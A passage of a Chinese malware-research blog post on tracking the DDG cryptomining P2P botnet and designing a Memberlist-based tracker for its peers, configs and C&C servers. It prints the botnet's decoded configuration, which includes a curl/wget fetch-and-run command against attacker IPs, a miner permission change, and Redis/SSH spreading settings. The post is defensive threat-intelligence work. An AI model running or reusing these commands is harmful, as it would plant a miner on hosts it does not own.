<li>分析透彻 Botnet 样本工作原理、攻击链条、控制方式、通信协议以及网络基础设施，评估该 Botnet 可能造成的危害；梳理中招后的清除方案，提取相关 IoC 并公开给安全社区。安全厂商在安全产品中实现基于样本特征、通信协议或者 IoC 的防御措施，保护用户的安全。这样可以削弱整个 Botnet；</li>
<li>联合 ISP 和执法机构，封堵 Botnet 背后的网络基础设施，对域名采取 Sinkhole 措施或者直接禁止解析，阻断 IP 访问甚至控制 C&amp;C 服务器的主机。如果 Botnet 的网络基础设施比较脆弱，比如只有这么一个 C&amp;C 服务器，这样会直接端掉(Take Down)整个 Botnet；</li>
<li>根据对 Botnet 的协议特征、攻击方式等方面的分析，或者根据对其 C&amp;C 域名的 Sinkhole 数据，度量 Botnet 的规模，统计 Bot 节点的信息，联合有关方面清除 Bot 节点上的 Bot 程序。这样也会削弱整个 Botnet；</li>
<li>通过对 Botnet 的跟踪（监控云端配置文件、解析 C&amp;C 服务器的最新指令或者 P2P 追踪等等），监控 Botnet 的最新动向，方便采取一定防御措施；</li>
<li>对于有缺陷的 P2P Botnet，通过向 Botnet 投毒的方式清除整个 Botnet。</li>
</ol>
<p>简单总结起来，就是<strong>能干掉的就干掉，干不掉的就想办法将它削弱</strong>。</p>
<h2 id="2-DDG-Mining-Botnet"><a href="#2-DDG-Mining-Botnet" class="headerlink" title="2. DDG.Mining.Botnet"></a>2. DDG.Mining.Botnet</h2><p>DDG.Mining.Botnet(下文称 <strong>ddg</strong>) 是一个挖矿僵尸网络。ddg 最初的结构比较简单：</p>
<ul>
<li><strong>具有蠕虫功能的恶意程序</strong>(下文简称 <strong>主样本</strong>)可以利用漏洞来入侵主机实现自主传播；</li>
<li>有 1~3 个<strong>文件下载服务器</strong>提供矿机程序和恶意 Shell 脚本的下载，Shell 脚本被具有蠕虫功能的恶意程序下载到失陷主机中用来做定时任务，实现常驻失陷主机；恶意矿机程序则被 Shell 脚本不断下载、启动来挖矿。</li>
</ul>
<p>360Netlab 对 ddg 进行了长期跟踪，对它的几个主要版本进行详细分析并发布 <a href="https://blog.netlab.360.com/tag/ddg/" target="_blank" rel="external">系列技术报告</a>。现在，ddg 已经集成了 P2P 机制，实现了 Bot 节点间的互联互通，构建成了一个<strong>非典型</strong> P2P Botnet(下文会解释为什么称它<strong>非典型</strong>)。</p>
<p>不过我们没能把  ddg 干掉，只做到了<strong>追踪</strong>(因为它内部有基于 RSA 数字签名的校验机制，无法向僵尸网络投毒；也没能 Take Down 它的 C&amp;C Server)，这也是本文的主题。目前我们可以做到以下四点：</p>
<ul>
<li>及时获取当前 ddg 中的 Bot 节点信息；</li>
<li>及时获取它最新的云端配置数据；</li>
<li>即使获取它释放出来的最新恶意样本；</li>
<li>及时获知它最新启用的 C&amp;C Server。</li>
</ul>
<p>接下来就从 ddg 的核心特性说起，参考这些核心特性一步一步设计一个 P2P Botnet Tracker。</p>
<h3 id="2-1-ddg-的网络结构"><a href="#2-1-ddg-的网络结构" class="headerlink" title="2.1 ddg 的网络结构"></a>2.1 ddg 的网络结构</h3><p>相比最初的结构，ddg 当前版本有两个新特性：</p>
<ul>
<li>1~3 个文件下载服务器同时提供云端配置数据，ddg 的主样本会通过向 <code>http://&lt;c&amp;c_server&gt;/slave</code> 发送 Post 请求来获取配置数据；</li>
<li>僵尸网络内启用了P2P通信机制：集成了分布式节点控制框架 <a href="https://github.com/hashicorp/memberlist" target="_blank" rel="external">Memberlist</a>，该框架实现了扩展版的<strong>弱一致性分布式控制协议 <a href="http://www.cs.cornell.edu/projects/Quicksilver/public_pdfs/SWIM.pdf" target="_blank" rel="external">SWIM</a></strong> (扩展版的协议称为 <strong><a href="https://arxiv.org/pdf/1707.00788.pdf]" target="_blank" rel="external">Lifeguard</a></strong> )，并以此实现了 P2P 机制，用来管理自己的 Peers(Bots)。</li>
</ul>
<p>综合一下，当前集成了 P2P 机制的 ddg，网络结构概要图大致如下：</p>
<p><img src="/imgs/ddg_botnet_structure.png" style="zoom:50%"></p>
<p>上图黄色虚线聚焦的图标，代表 ddg 的恶意服务器，提供主样本程序、恶意 Shell 脚本和矿机程序的下载，还提供云端配置数据的下发服务。这里就可以解释前文中说 ddg 当前版本是<strong>非典型</strong> P2P Botnet 的理由了：</p>
<ul>
<li><strong>网络结构</strong>：典型的 P2P Botnet 网络结构，至少不会有中间一个<strong>中心化</strong>的文件和配置数据服务器，加上这么一个中心化的恶意服务器，显得 P2P 的网络结构不是那么“纯粹”。一个比较纯粹的 P2P Botnet ，网络结构可以参考名噪一时的 P2P Botnet <strong><a href="https://blog.netlab.360.com/hajime-status-report/" target="_blank" rel="external">Hajime</a></strong>，去除中间那个中心化的恶意服务器，所有指令、文件和配置数据的下发与传播，都靠 P2P 协议来实现，在 Bot 节点之间互相传递。而 ddg 这种网络结构，也使得它构建的 P2P 网络承载的功能比较鸡肋：只用来做 Bot 节点间的常规通信，不能承载 Botnet 的关键恶意活动；</li>
<li><strong>网络协议</strong>：构建 P2P 网络，无论是常见的 BT 文件共享网络还是恶意的 Botnet，比较多的还是基于 <a href="https://en.wikipedia.org/wiki/Distributed_hash_table" target="_blank" rel="external">DHT</a> 协议来实现。Hajime 和同样是 Go 语言编写的 P2P Botnet <strong><a href="https://vms.drweb.com/virus/?_is=1&amp;i=8436299" target="_blank" rel="external">Rex</a></strong> ，用来构建 P2P 网络的协议都是 DHT。而 ddg 构建 P2P 网络的框架则是本来在分布式系统领域用来做集群成员控制的 Memberlist 框架，该框架用基于 Gossip 的弱一致性分布式控制协议来实现。如果不太明白这个框架常规的应用场景，那么把它跟 <a href="https://en.wikipedia.org/wiki/Apache_ZooKeeper" target="_blank" rel="external">Apache ZooKeeper</a> 来对比一下或许更容易理解：它们都可用于分布式节点的服务发现，只不过 ZooKeeper 是强一致性的，而 Memberlist 是弱一致性(参考： <a href="https://www.jianshu.com/p/5e7e78788d12" target="_blank" rel="external">基于流言协议的服务发现存储仓库设计</a>)。</li>
</ul>
<p>基于以上两点，足够说明 ddg 是一个 <strong>非典型</strong> P2P Botnet。</p>
<h3 id="2-2-ddg-的-C-amp-C-服务器"><a href="#2-2-ddg-的-C-amp-C-服务器" class="headerlink" title="2.2 ddg 的 C&amp;C 服务器"></a>2.2 ddg 的 C&amp;C 服务器</h3><p>ddg 的服务器自从提供了云端配置数据的下发，便具备了传统僵尸网络中的 Command and Control 功能，所以可以名正言顺地称之为 C&amp;C 服务器。</p>
<p>ddg 的服务器地址，在是内置在主样本中的。在主样本中有一个 <strong>HUB IP List</strong> 的结构，里面有上百个 IP 地址的列表，这份列表中，绝大部分是失陷主机的 WAN_IP 地址，只有1~3 个是当前存活的 C&amp;C 地址(1 个 <strong>主 C&amp;C 服务器</strong>，2 个<strong>备用 C&amp;C 服务器</strong>)。主样本执行期间会遍历这份 IP 列表，找到可用的 C&amp;C 服务器地址，通过向 <code>http://&lt;c&amp;c_server&gt;/slave</code> 发送 Post 请求来获取配置数据。</p>
<p>云端配置数据是用 <a href="https://msgpack.org" target="_blank" rel="external">msgPack</a> 编码过的，解码后的配置数据中有最新的恶意 Shell 脚本下载地址，这个下载地址中的 IP 即为最新的 <strong>主 C&amp;C 服务器</strong>。</p>
<p>恶意的 Shell 脚本中会给出最新的主样本下载地址，这个下载地址中的 IP 也是最新的<strong>主 C&amp;C 服务器</strong>，目前来看，恶意 Shell 脚本中的 C&amp;C 地址与云端配置数据中提供的 C&amp;C 地址都是一致的。</p>
<p>这样一来，共有 3 中方式能获取到最新的 C&amp;C 服务器地址：</p>
<ol>
<li>解析 HUB IP List，通过遍历其中的 IP 列表来发现 C&amp;C 服务器地址；</li>
<li>解析恶意 Shell 脚本，提取其中的 C&amp;C服务器地址；</li>
<li>解析配置文件，提取其中的 C&amp;C 服务器地址。</li>
</ol>
<h3 id="2-3-ddg-的云端配置数据"><a href="#2-3-ddg-的云端配置数据" class="headerlink" title="2.3 ddg 的云端配置数据"></a>2.3 ddg 的云端配置数据</h3><p>前文提到过，ddg 的云端配置数据，是经过 msgPack 编码的，配置数据解码后的内容如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    'Data':&#123;</div><div class="line">        'CfgVer': 6,</div><div class="line">        'Cmd': &#123;</div><div class="line">            'AAredis': &#123;</div><div class="line">                'Duration': '240h',</div><div class="line">                'GenAAA': False,</div><div class="line">                'GenLan': True,</div><div class="line">                'IPDuration': '6h',</div><div class="line">                'Id': 6062,</div><div class="line">                'Ports': [6379, 6389, 7379],</div><div class="line">                'ShellUrl': 'hxxp://104.248.181.42:8000/i.sh',</div><div class="line">                'Timeout': '1m',</div><div class="line">                'Version': 3017</div><div class="line">            &#125;,</div><div class="line">            'AAssh': &#123;</div><div class="line">                'Duration': '240h',</div><div class="line">                'GenAAA': False,</div><div class="line">                'GenLan': True,</div><div class="line">                'IPDuration': '12h',</div><div class="line">                'Id': 2057,</div><div class="line">                'NThreads': 100,</div><div class="line">                'Ports': [22, 2222, 12222, 52222, 1987],</div><div class="line">                'ShellUrl': 'hxxp://104.248.181.42:8000/i.sh',</div><div class="line">                'Timeout': '1m',</div><div class="line">                'Version': 3017</div><div class="line">            &#125;,</div><div class="line">            'Killer': [&#123;</div><div class="line">                    'Expr': '(/tmp/ddgs.3011|/tmp/ddgs.3012|/tmp/ddgs.3013|/tmp/ddgs.3014|/tmp/ddgs.3015|   /tmp/ddgs.3016|/tmp/ddgs.3017|/tmp/ddgs.3019)',</div><div class="line">                    'Id': 475,</div><div class="line">                    'Timeout': '60s',</div><div class="line">                    'Version': 3017</div><div class="line">                &#125;,</div><div class="line">                &#123;</div><div class="line">                    'Expr': '.+(cryptonight|stratum+tcp://|dwarfpool.com|supportxmr.com).+',</div><div class="line">                    'Id': 483,</div><div class="line">                    'Timeout': '60s',</div><div class="line">                    'Version': -1</div><div class="line">                &#125;,</div><div class="line">                &#123;</div><div class="line">                    'Expr': './xmr-stak|./.syslog|/bin/wipefs|./xmrig|/tmp/wnTKYg|/tmp/2t3ik',</div><div class="line">                    'Id': 484,</div><div class="line">                    'Timeout': '60s',</div><div class="line">                    'Version': -1</div><div class="line">                &#125;,</div><div class="line">                &#123;</div><div class="line">                    'Expr': '/tmp/qW3xT.+',</div><div class="line">                    'Id': 481,</div><div class="line">                    'Timeout': '60s',</div><div class="line">                    'Version': 3017</div><div class="line">                &#125;</div><div class="line">            ],</div><div class="line">            'LKProc': [&#123;</div><div class="line">                'Expr': '/tmp/qW3xT.5',</div><div class="line">                'Id': 488,</div><div class="line">                'Timeout': '60s',</div><div class="line">                'Version': 3020</div><div class="line">            &#125;],</div><div class="line">            'Sh': [&#123;</div><div class="line">                    'Id': 479,</div><div class="line">                    'Line': '(curl -fsSL hxxp://104.248.181.42:8000/i.sh||wget -q -O-  hxxp://132.148.241.138:8000/i.sh) | sh',</div><div class="line">                    'Timeout': '120s',</div><div class="line">                    'Version': -1</div><div class="line">                &#125;,</div><div class="line">                &#123;</div><div class="line">                    'Id': 486,</div><div class="line">                    'Line': 'chattr -i /tmp/qW3xT.5; chmod +x /tmp/qW3xT.5',</div><div class="line">                    'Timeout': '20s',</div><div class="line">                    'Version': 3017</div><div class="line">                &#125;</div><div class="line">            ]</div><div class="line">        &#125;,</div><div class="line">        'Config': &#123;</div><div class="line">            'Interval': '60s'</div><div class="line">        &#125;,</div><div class="line">        'Miner': [&#123;</div><div class="line">            'Exe': '/tmp/qW3xT.5',</div><div class="line">            'Md5': 'fb6bf5af8771b0dc446861484335fc5e',</div><div class="line">            'Url': '/static/qW3xT.5'</div><div class="line">        &#125;]</div><div class="line">    &#125;,</div><div class="line">    'Signature': [0x3b,0xd9,0x73,0x04,0x6d,0x75,0x68,0xe8,0xdd,0xd6,0x0c,0x5e,0xac,0xd1,0x29,0x2d,0x16,0x31,0x03,0xf4,0xfb,0xbb,0xa8,0x7d,0xba,0x6a,0xc8,0xda,0x6f,0xec,0x42,0x16,0x6a,0x00,0x8b,0x62,0x3f,0xa1,0x11,0x9b,0x16,0xe8,0xf2,0x13,0xb1,0x45,0x40,0xc5,0xd4,0xc6,0xaa,0x90,0x99,0x98,0x4b,0xc9,0x70,0x66,0x77,0x18,0xa9,0x82,0x53,0xb9,0x4f,0x10,0x05,0xdf,0x8d,0x6c,0x3a,0x31,0x2b,0x45,0x6f,0x9d,0xcb,0xd2,0x7d,0x5e,0x90,0x5f,0xb9,0x59,0x9e,0xa2,0x40,0x02,0x1b,0xe9,0xed,0xd5,0x57,0xb5,0x09,0x41,0x1e,0xd8,0x41,0xd8,0x0b,0xa8,0xd1,0x54,0x00,0xab,0x43,0xdc,0x70,0xce,0xca,0x14,0xc5,0x19,0xc9,0x37,0x0f,0x19,0xe0,0x02,0x95,0x30,0x57,0xa6,0xbb,0xc4,0xa6,0x85,0x51,0xcc,0x9b,0x0d,0xc4,0xc5,0x7d,0xb9,0xc4,0xa0,0x93,0x00,0xec,0x52,0x06,0x77,0xfe,0x82,0x52,0x1e,0x88,0xf2,0xe2,0xc6,0x21,0x3e,0x81,0x7e,0x1e,0x53,0x9d,0xb0,0xab,0xd4,0xc2,0xa3,0x85,0x8b,0xef,0xac,0xdd,0x9d,0x4b,0x5a,0x13,0x8e,0xa1,0x31,0x6d,0xc5,0xb2,0xf4,0xca,0x54,0x85,0x29,0xa0,0x62,0x0d,0xac,0xde,0xfa,0x86,0x09,0x2b,0x1c,0x05,0x5f,0xa0,0xa4,0x91,0x11,0xb0,0x6d,0x7e,0x1c,0xab,0x31,0x6f,0xca,0x64,0x15,0x44,0xe5,0xaf,0x24,0x12,0xb6,0x74,0xde,0x9c,0xc1,0xf7,0x0c,0x22,0x80,0x1f,0x07,0x2b,0x57,0xe2,0xfb,0xf9,0x39,0x0b,0x1b,0x4f,0xa3,0x82,0x07,0xce,0x35,0x41,0x23,0x73,0x94,0x8c,0x27,0x1b,0x77,0x1f,0x5e,0xdd,0xb5,0xb1,0xa6,0xa1,0x6c]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>注意配置数据最后一项： <strong>Signature</strong> ，这其实是木马作者拿自己的 RSA 私钥对配置数据中的 <strong>Data</strong> 部分（真正用到的配置）生成的一个 RSA 签名字段。样本在解码配置数据之后，会用样本中内置的 RSA 公钥对 <strong>Data</strong> 部分配置数据进行校验，校验通过之后才会采用这些配置。样本中内置的 RSA 公钥如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">-----BEGIN PUBLIC KEY-----</div><div class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1+/izrOGcigBPC+oXnr2  </div><div class="line">S3JI76iXxqn7e9ONAmNS+m5nLQx2g0GW44TFtMHhDp1lPdUIui1b1odu36i7Cf0g  </div><div class="line">31vdYi1i6nGfXiI7UkHMsLVkGkxEknNL1c1vv0qE1b2i2o4TlcXHKHWOPu4xrpYY  </div><div class="line">m3Fqjni0n5+cQ8IIcVyjkX7ON0U1n8pQKRWOvrsPhO6tvJnLckK0P1ycGOcgNiBm  </div><div class="line">sdA5WDjw3sg4xWCQ9EEpMeB0H1UF/nv7AZQ0etncMxhiWoBxamuPWY/KS3wZStUd  </div><div class="line">gsMBOAOOpnbxL9N+II7uquQQkMmO6HriXRmjw14OmSBEoEcFMWF2j/0HPVasOcx2  </div><div class="line">xQIDAQAB  </div><div class="line">-----END PUBLIC KEY-----</div></pre></td></tr></table></figure>
<p>由此可见，这份配置数据无法伪造。这样一来，我们就只能加入 DDG 的 P2P 网络进行节点探测，而无法对整个 P2P 网络进行投毒。</p>
<h3 id="2-4-ddg-的-P2P-节点"><a href="#2-4-ddg-的-P2P-节点" class="headerlink" title="2.4 ddg 的 P2P 节点"></a>2.4 ddg 的 P2P 节点</h3><p>ddg 的主样本通过 Memberlist 框架成功加入了 P2P 网络之后，就会调用 <code>memberlist.Members()</code> 函数来获取当前 P2P 网络中的 Peers 列表。在 ddg 最近的几个版本中，主样本会把这份 Peers 列表保存到受害主机本地 <code>~/.ddg/&lt;VERSION_NUMBER&gt;.bs</code> 文件中。最新的版本则不会保存到本地，而是用开源的内嵌 KV 存储引擎 <a href="https://github.com/boltdb/bolt" target="_blank" rel="external">Bolt</a> 取代了之前的 <code>~/.ddg/&lt;VERSION_NUMBER&gt;.bs</code> 文件。即，样本获取到的 Peers 列表不再明文存储到本地文件中，而是存放到了内嵌的一个小型数据库中。</p>
<p>我们要获取 ddg 的 Peers 节点，就可以直接通过调用 <code>memberlist.Members()</code> 函数来获取。</p>
<h2 id="3-追踪程序设计"><a href="#3-追踪程序设计" class="headerlink" title="3. 追踪程序设计"></a>3. 追踪程序设计</h2><h3 id="3-1-追踪程序的执行流程"><a href="#3-1-追踪程序的执行流程" class="headerlink" title="3.1 追踪程序的执行流程"></a>3.1 追踪程序的执行流程</h3><p>前面说过，设计追踪程序的最终目标，有 4 个，其中涉及到 Peer 信息的获取和保存、样本与配置数据的解析和保存、记录最新启用的 C&amp;C Server ……这样一来，就不可避免地将相关数据和文件保存到本地或数据库中。</p>
<p>我们可以把最新一次探测到的 P2P 节点信息存储到数据库中，把样本文件、配置数据、最新的 C&amp;C Server 列表保存到本地文件中。根据 <strong>Memberlist</strong> 框架的实现，程序要调用 <code>memberlist.Join()</code> 函数来加入一个已存在的 P2P 网络，而这个函数需要一个 IP List( Go 变量 <code>[] string</code> ，下文简称 <strong>init_peers</strong>) 来作为加入 P2P 网络的“介绍人”。当然，这个 IP List 中的 IP，应该是当前已加入 P2P 网络的 IP (按照这个概念，这些 IP 应该是对应常规 P2P 网络中的 Node，P2P 网络中的 <strong>Node</strong> 和 <strong>Peer</strong> 的概念可以自行了解，为了简化描述，本文把 P2P 网络中的节点统称为 <strong>Peer</strong>)。</p>
<p>前文还说过，ddg 主样本中有一份内置硬编码的 HUB IP List。其实，这一份 HUB IP List 就可以拿来当做 <code>memberlist.Join()</code> 函数的参数，即 <strong>init_peers</strong>。为了方便程序运行，我们可以把这一份 IP List 提前保存到数据库中，追踪程序每次运行，都要先从数据库中读取最新的 <strong>init_peers</strong>，通过 <strong>init_peers</strong> 加入 ddg 的 P2P 网络。</p>
<p>这里先说一下追踪程序的概要执行流程，后面分步骤详细说明：</p>
<ol>
<li>从数据库中读取 <strong>init_peers</strong> IP List ，并调用 <strong>memberlist.Join()</strong> 加入 ddg 的 P2P 网络；</li>
<li>成功加入 P2P 网络后，调用 <code>memberlist.Members()</code> 获取当前网络中的最新 Peers List；</li>
<li>解析获取到的 Peers List 中的 Peers 信息，将每个 Peer 信息拆解成 <strong>IP:Port:Versioin:Hash:DateTime</strong> 5 元组，存到数据库中；</li>
<li>将每个 Peer IP ，拼接 URL 串 <code>http://&lt;peer_ip&gt;:8000/slave</code> ，并向该 URL 发送 Post 请求，以获取经过 msgPack 编码的配置数据；</li>
<li>如果成功从某个 Peer 上获取到了配置数据，则：<ul>
<li>将该 Peer IP 暂存到一个非重复的、并发安全的 IP List 结构中；</li>
<li>保存 RAW 格式的配置数据到本地；</li>
<li>用该 Peer IP 拼接 URL 串 <code>http://&lt;peer_ip&gt;:8000/i.sh</code> ，并用 HTTP GET 请求的方式尝试获取最新的恶意 Shell 脚本；</li>
<li>对比上述 i.sh 下载链接与刚获取到的最新配置数据中执行的 i.sh 下载链接是否相同，不同则对最新配置数据中指定的 i.sh 脚本也做下载&amp;解析操作。</li>
</ul>
</li>
<li>如果成功获取到 i.sh 脚本，则解析其中的样本 Download URL，下载样本，同本地已下载到的其他样本 MD5 和下载 URL 作对比，MD5 和 下载 URL 其中之一是新的，就保留样本，否则删除刚下载到的样本。对于新样本，通过 Slack 的 Message 接口 Push 相关消息到自己的 Slack Channel 中；</li>
<li>最后，将非重复的最新活跃的 C&amp;C Server 列表保存到本地文件中。</li>
</ol>
<h3 id="3-2-加入-P2P-网络"><a href="#3-2-加入-P2P-网络" class="headerlink" title="3.2 加入 P2P 网络"></a>3.2 加入 P2P 网络</h3><p>前文提到，调用 <code>memberlist.Join()</code> 来加入 ddg 的 P2P 网络，需要一个 <strong>init_peers</strong> 的 IP List。这个 IP List 最初来自 ddg 主样本中硬编码的 HUB IP List，而以后追踪程序每次执行，都要先从数据库中获取这个 IP List。这里先给出一个可用的数据表结构，用来存储 Peer 信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">+---------+----------------------+------+-----+---------+----------------+</div><div class="line">| Field   | Type                 | Null | Key | Default | Extra          |</div><div class="line">+---------+----------------------+------+-----+---------+----------------+</div><div class="line">| id      | int(10) unsigned     | NO   | PRI | &lt;null&gt;  | auto_increment |</div><div class="line">| ip      | char(16)             | NO   |     | &lt;null&gt;  |                |</div><div class="line">| port    | smallint(5) unsigned | NO   |     | &lt;null&gt;  |                |</div><div class="line">| version | smallint(5) unsigned | NO   |     | &lt;null&gt;  |                |</div><div class="line">| hash    | char(32)             | YES  |     | &lt;null&gt;  |                |</div><div class="line">| tdate   | datetime             | NO   |     | &lt;null&gt;  |                |</div><div class="line">+---------+----------------------+------+-----+---------+----------------+</div></pre></td></tr></table></figure>
<p>最新的 Peers 信息在我们加入 ddg 的 P2P 网络后可以调用 <code>memberlist.Members()</code> 来获取。在 <strong>Memberlist</strong> 框架的源码中，这个函数返回的是一个 Node 信息指针列表 (Go 语言变量 <code>[]*Node</code>)。Memberlist 框架中的 <strong>Node</strong> 结构体的定义如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Node represents a node in the cluster.</span></div><div class="line"><span class="keyword">type</span> Node <span class="keyword">struct</span> &#123;</div><div class="line">	Name <span class="keyword">string</span></div><div class="line">	Addr net.IP</div><div class="line">	Port <span class="keyword">uint16</span></div><div class="line">	Meta []<span class="keyword">byte</span> <span class="comment">// Metadata from the delegate for this node.</span></div><div class="line">	PMin <span class="keyword">uint8</span>  <span class="comment">// Minimum protocol version this understands</span></div><div class="line">	PMax <span class="keyword">uint8</span>  <span class="comment">// Maximum protocol version this understands</span></div><div class="line">	PCur <span class="keyword">uint8</span>  <span class="comment">// Current version node is speaking</span></div><div class="line">	DMin <span class="keyword">uint8</span>  <span class="comment">// Min protocol version for the delegate to understand</span></div><div class="line">	DMax <span class="keyword">uint8</span>  <span class="comment">// Max protocol version for the delegate to understand</span></div><div class="line">	DCur <span class="keyword">uint8</span>  <span class="comment">// Current version delegate is speaking</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>其中第一项 <strong>Name</strong> 是形如 <strong>VerNumber.HashValue</strong>  的一个字符串，如：<strong>3020.b1634b9e0c747a6ae728e07c40883e2d</strong> 。这里的 Hash 值在 Memberlist 框架中被定义为 <strong>UID</strong> ，每一个 Peer 都不同，其值是通过对当前 Peer 主机的网络配置用 MD5 算法计算得出。</p>
<p>Memberlist 的<a href="https://github.com/hashicorp/memberlist" target="_blank" rel="external">开源项目主页</a>上，有一个简单的 Usage Demo，演示加入一个集群(本文就指 ddg 的 P2P 网络了)并获取节点信息的最简方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">/* Create the initial memberlist from a safe configuration.</div><div class="line">   Please reference the godoc for other default config types.</div><div class="line">   http://godoc.org/github.com/hashicorp/memberlist#Config</div><div class="line">*/</div><div class="line">list, err := memberlist.Create(memberlist.DefaultLocalConfig())</div><div class="line">if err != nil &#123;</div><div class="line">	panic(&quot;Failed to create memberlist: &quot; + err.Error())</div><div class="line">&#125;</div><div class="line"></div><div class="line">// Join an existing cluster by specifying at least one known member.</div><div class="line">n, err := list.Join([]string&#123;&quot;1.2.3.4&quot;&#125;)</div><div class="line">if err != nil &#123;</div><div class="line">	panic(&quot;Failed to join cluster: &quot; + err.Error())</div><div class="line">&#125;</div><div class="line"></div><div class="line">// Ask for members of the cluster</div><div class="line">for _, member := range list.Members() &#123;</div><div class="line">	fmt.Printf(&quot;Member: %s %s\n&quot;, member.Name, member.Addr)</div><div class="line">&#125;</div><div class="line"></div><div class="line">// Continue doing whatever you need, memberlist will maintain membership</div><div class="line">// information in the background. Delegates can be used for receiving</div><div class="line">// events when members join or leave.</div></pre></td></tr></table></figure>
<p>可以看到在执行 <strong>Join()</strong> 函数加入集群之前，还要调用 <strong>memberlist.Create()</strong> 函数生成一个 Peer 对象(代表当前 Peer)，然后用当前对象执行 <strong>Join</strong> 以及后续操作。这里有一个关键点是当前 Peer 的配置。这份配置的底层结构体定义，在 <a href="https://godoc.org/github.com/hashicorp/memberlist#Config" target="_blank" rel="external">Memberlist 的 Godoc 文档</a>中有详细说明，此处不赘述。这份配置结构中的两个关键配置项(网络配置和密钥)，关乎到追踪程序能否成功加入到 ddg 的 P2P 网络中，以及加入之后能否正常与其他 Peers 通信，这两个关键点要<strong>逆向 ddg 主样本</strong>和熟知 <strong>Memberlist 的原理和实现</strong>才能搞定，这里也不赘述。想要自行实现这么一套追踪程序，需要自行完成这两个工作。</p>
<p>需要一提的是，配置项中有一个关于日志输出的配置项：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">// Logger is a custom logger which you provide. If Logger is set, it will use</div><div class="line">// this for the internal logger. If Logger is not set, it will fall back to the</div><div class="line">// behavior for using LogOutput. You cannot specify both LogOutput and Logger</div><div class="line">// at the same time.</div><div class="line">Logger *log.Logger</div></pre></td></tr></table></figure>
<p>我们要用到日志功能，把全局的日志句柄配置在这里，这样 Memberlist 整个框架的运行日志都会打到我们指定的日志文件中。</p>
<h3 id="3-3-获取并解析最新的-Peers-List"><a href="#3-3-获取并解析最新的-Peers-List" class="headerlink" title="3.3 获取并解析最新的 Peers List"></a>3.3 获取并解析最新的 Peers List</h3><p>前文提到，获取最新的 Peers List，只需在加入 ddg 的 P2P 网络后调用 <code>memberlist.Members()</code> 即可。</p>
<p>其实只说了一半，因为这里还有个偶然发现的小 Trick：这个函数获取到的 Peers List 数量并不大，反倒是从 Memberlist 框架的运行日志中可以抽取更多 Peer 信息。</p>
<p>根据 Memberlist 的框架特性，当前节点加入 P2P 网络之后，会随机与其他 Peers 以 Gossip 的形式通信，这种通信具有节点探测的功能。通信的结果会记录在日志中，尤其是通信失败的日志，记录的比较详细。一条失败的 Gossip 通信日志如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">2019/01/23 08:44:53 [ERR] memberlist: Failed to send gossip to 58.144.150.24:7946: write udp 127.0.0.1:7946-&gt;58.144.150.24:7946: sendto: invalid argument</div></pre></td></tr></table></figure>
<p>打出这段日志的代码，在 <a href="https://github.com/hashicorp/memberlist/blob/master/state.go" target="_blank" rel="external">memberlist/stat.go</a> 中实现：</p>
<p><img src="/imgs/gossip_failed_msg.png" alt=""></p>
<p>不过，这段错误信息还不足以提供我们想要的 Peer Info 5 元组。那就动手 Patch 一下这段代码，让它打出我们想要的信息。Patch 后的代码如下：</p>
<p><img src="/imgs/gossip_failed_msg_patched.png" alt=""></p>
<p>然后，打出来的日志内容就会是如下形式：</p>
